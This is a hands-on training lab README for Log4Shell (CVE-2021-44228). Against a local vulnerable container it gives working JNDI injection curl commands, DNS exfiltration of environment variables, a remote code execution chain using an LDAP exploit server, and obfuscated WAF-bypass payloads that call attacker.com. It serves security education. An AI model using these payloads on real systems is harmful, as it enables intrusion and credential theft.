# Log4Shell (CVE-2021-44228) JNDI Injection & RCE Lab

## Overview

**Log4Shell (CVE-2021-44228)** is a critical Remote Code Execution (RCE) vulnerability in Apache Log4j 2 (versions 2.0-beta9 to 2.14.1).

Apache Log4j supports message lookup substitution syntax `${prefix:name}` (such as `${java:version}`, `${env:USER}`). When Log4j encounters the JNDI prefix (`${jndi:...}`), it leverages the Java Naming and Directory Interface to query an external directory service (LDAP, RMI, DNS, or LDAPS). If an attacker supplies an untrusted payload that gets logged, Log4j reaches out to the attacker's LDAP server and executes arbitrary Java bytecode loaded from the remote codebase.

This lab provides an isolated Spring Boot target application incorporating vulnerable Log4j 2.14.1, which logs the value of the `X-Api-Version` HTTP header.

- **Target URL**: `http://localhost:8104`
- **Vulnerable Header**: `X-Api-Version`
- **Container Name**: `cyberlab_web_log4shell`
- **Shortcut**: `./lab start log4shell`
- **Directory**: `Classes/02_web_penetration_tester/20_21_24_server_side_ssrf_xxe_ssti/log4shell_jndi`

---

## Objectives & Core Learning Areas

1. **JNDI Lookup Mechanics**: Understand how Java Naming and Directory Interface handles LDAP/RMI resource lookup and class loading.
2. **Out-of-Band (OOB) Verification**: Detect vulnerable logging points safely using DNS and LDAP queries without executing malicious payloads.
3. **Remote Code Execution (RCE)**: Deploy a malicious LDAP referral server (e.g., JNDIExploit / marshalsec) to deliver compiled Java bytecode to the vulnerable container.
4. **WAF Evasion & Filter Bypasses**: Bypass signature-based WAFs and intrusion detection systems using nested lookup expressions and string manipulation substitutions.
5. **Environment Variable Exfiltration**: Steal server environment variables (AWS credentials, API keys) via blind JNDI DNS/LDAP exfiltration.

---

## Step-by-Step Exploit Exercises

### Exercise 1: Starting the Lab & Baseline Verification

1. Start the vulnerable Log4Shell application:
   ```bash
   ./lab start log4shell
   ```
2. Verify normal application response:
   ```bash
   curl -i http://localhost:8104/
   ```
   The application returns `Hello, world!`.
3. Check container logs to see logged requests:
   ```bash
   docker logs cyberlab_web_log4shell
   ```

---

### Exercise 2: Out-of-Band (OOB) Detection via JNDI Injection

1. Use an Out-of-Band interaction tool such as the local Interactsh collaborator server (`./lab start oob`) or public interactsh:
   ```bash
   # If running interactsh client or local listener on port 8090/5354:
   COLLAB="your-unique-id.interact.sh"
   ```
2. Inject a basic JNDI lookup payload into the `X-Api-Version` header:
   ```bash
   curl http://localhost:8104/ -H "X-Api-Version: \${jndi:ldap://$COLLAB/test}"
   ```
3. Inspect your collaborator log:
   - You will observe an immediate incoming DNS query and an LDAP connection attempt originating from the vulnerable container, confirming vulnerability.

---

### Exercise 3: Environment Variable & System Data Exfiltration

Log4j can recursively resolve lookups. By nesting `${env:...}` or `${sys:...}` lookups inside the JNDI hostname, sensitive data is leaked via DNS:

1. Leak the Java runtime version:
   ```bash
   curl http://localhost:8104/ -H "X-Api-Version: \${jndi:ldap://\${sys:java.version}.$COLLAB/a}"
   ```
2. Leak user and environment variables:
   ```bash
   curl http://localhost:8104/ -H "X-Api-Version: \${jndi:ldap://\${env:USER}.\${env:HOSTNAME}.$COLLAB/a}"
   ```
3. Observe the subdomain received at the listener containing the resolved environment variables.

---

### Exercise 4: Full Remote Code Execution (RCE) Chain

To achieve full RCE on the vulnerable target:

1. Start an LDAP referral server using **JNDIExploit** or **marshalsec**:
   ```bash
   # Run JNDIExploit listener on your host (example on port 1389):
   java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888
   ```
2. Send the exploit payload pointing to the malicious LDAP server:
   ```bash
   curl http://localhost:8104/ -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}'
   ```
   _(The Base64 payload decodes to `touch /tmp/pwned`)_
3. Verify remote execution inside the target container:
   ```bash
   docker exec cyberlab_web_log4shell ls -la /tmp/pwned
   ```
   The file `/tmp/pwned` is created, confirming full arbitrary code execution.

---

### Exercise 5: WAF Evasion & Filter Bypass Techniques

Web Application Firewalls often block literal strings like `jndi:ldap` or `jndi:rmi`. Because Log4j recursively evaluates lookup expressions, you can bypass naive regex filters using variable manipulation:

1. **Case Conversion Lookups**:
   ```text
   ${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/exploit}
   ```
2. **Empty Default Substitution (`::-`)**:
   ```text
   ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}
   ```
3. **Undefined Environment Variable Fallbacks**:
   ```text
   ${${env:NON_EXISTING_KEY:-jndi}:${env:NON_EXISTING_KEY:-ldap}://attacker.com/exploit}
   ```
4. **Date Formatter Bypasses**:
   ```text
   ${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://attacker.com/exploit
   ```
5. Test these payloads against the target:
   ```bash
   curl http://localhost:8104/ -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://172.17.0.1:1389/test}'
   ```
   Check container logs to verify Log4j successfully resolves the obfuscated string back to `jndi:ldap`.

---

## YouTube Walkthroughs & Solving Guides

- [CVE-2021-44228 - Log4j Explained & Exploited](https://www.youtube.com/watch?v=7qoPDq41xhQ)
- [Log4J - CVE 2021-44228 (Log4Shell) - Exploitation & Mitigation](https://www.youtube.com/watch?v=lJeAgQQaDEw)
- [Log4j (CVE-2021-44228) RCE Vulnerability Explained](https://www.youtube.com/watch?v=0-abhd-CLwQ)
- [Log4j Lookups in Depth // Log4Shell CVE-2021-44228 - Part 2](https://www.youtube.com/watch?v=iI9Dz3zN4d8)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start Log4Shell vulnerable app
./lab start log4shell

# Check container status
./lab status

# Inspect application logs
docker logs -f cyberlab_web_log4shell

# Stop the lab
./lab stop log4shell
```
